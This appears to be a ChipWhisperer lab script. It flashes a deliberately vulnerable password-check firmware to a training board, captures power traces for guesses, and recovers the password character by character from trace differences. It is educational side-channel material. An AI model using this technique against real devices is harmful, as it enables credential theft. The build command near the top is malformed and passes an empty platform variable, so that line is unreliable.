from tqdm.notebook import tqdm
import matplotlib.pyplot as plt
import matplotlib.pylab as plt
import numpy as np
import chipwhisperer as cw
import time
import subprocess

SCOPETYPE = 'OPENADC'
PLATFORM = 'CWLITEXMEGA'

#*********************BEGIN SETUP***********************
def subprocessCmd(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    processStdOut = process.communicate()[0].strip()
    print (processStdOut)

#build target board firmware
command = '-s "$PLATFORM"; cd ../../requiredFiles/hardware/victims/firmware/basic-passwdcheck; make PLATFORM=$1 CRYPTO_TARGET=NONE'
subprocessCmd(command)

try:
    if not scope.connectStatus:
        scope.con()
except NameError:
    scope = cw.scope()

try:
    target = cw.target(scope)
except IOError:
    print("INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.")
    print("INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.")
    scope = cw.scope()
    target = cw.target(scope)

print("INFO: Found ChipWhisperer😍")

if "STM" in PLATFORM or PLATFORM == "CWLITEARM" or PLATFORM == "CWNANO":
    prog = cw.programmers.STM32FProgrammer
elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
    prog = cw.programmers.XMEGAProgrammer
else:
    prog = None

time.sleep(0.05)
scope.default_setup()

def reset_target(scope):
    if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
        scope.io.pdic = 'low'
        time.sleep(0.1)
        scope.io.pdic = 'high_z'  # XMEGA doesn't like pdic driven high
        time.sleep(0.1)  # xmega needs more startup time
    else:
        scope.io.nrst = 'low'
        time.sleep(0.05)
        scope.io.nrst = 'high_z'
        time.sleep(0.05)

#programming target
cw.program_target(
    scope, prog, "../../requiredFiles/hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex".format(PLATFORM))

def cap_pass_trace(pass_guess):
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        target.read(num_char, 10)
        time.sleep(0.01)
        num_char = target.in_waiting()

    scope.arm()
    target.write(pass_guess)
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')

    trace = scope.get_last_trace()
    return trace

scope.adc.samples = 3000
#*********************SETUP COMPLETED***********************

trace_test = cap_pass_trace("h\n")

#Basic sanity check
assert(len(trace_test) == 3000)
print("✔️ OK to continue!")
#%matplotlib notebook

#Example - capture 'h' - end with newline '\n' as serial protocol expects that
trace_h = cap_pass_trace("h\n")

print(trace_h)

# ###################
#%matplotlib inline
plt.figure(1)
plt.plot(cap_pass_trace("h\n"), 'b')
plt.plot(cap_pass_trace("0\n"), 'r')
plt.show()
#plt.show(block=False)
# ###################
plt.figure(2)
for c in tqdm('abcdefghijklmnopqrstuvwxyz0123456789'):
    trace = cap_pass_trace(c + "\n")
    plt.plot(trace[0:500])
plt.show()
#plt.show(block=False)


#****************Automating an Attack against One Character*****************
#%matplotlib notebook

plt.figure(3)
ref_trace = cap_pass_trace("\x00\n")[0:500]
plt.plot(ref_trace)
other_trace = cap_pass_trace("c\n")[0:500]
plt.plot(other_trace)
plt.show()
#plt.show(block=False)

plt.figure(4)
ref_trace = cap_pass_trace("h0p\x00\n")[0:500]

for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
    trace = cap_pass_trace('h0p' + c + "\n")[0:500]
    plt.plot(trace - ref_trace)
#plt.show(block=False)
plt.show()
ref_trace = cap_pass_trace("h0p\x00\n")

for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
    trace = cap_pass_trace("h0p" + c + "\n")
    diff = np.sum(np.abs(trace - ref_trace))

    print("{:1} diff = {:2}".format(c, diff))
#****************END Automating an Attack against One Character*****************


#*******************Running a Full Attack********************
guessed_pw = ""

for _ in range(0, 5):

    ref_trace = cap_pass_trace(guessed_pw + "\x00\n")

    for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
        trace = cap_pass_trace(guessed_pw + c + "\n")
        diff = np.sum(np.abs(trace - ref_trace))

        if diff > 40.0:
            guessed_pw += c
            print(guessed_pw)
            break
#*******************END Running a Full Attack********************
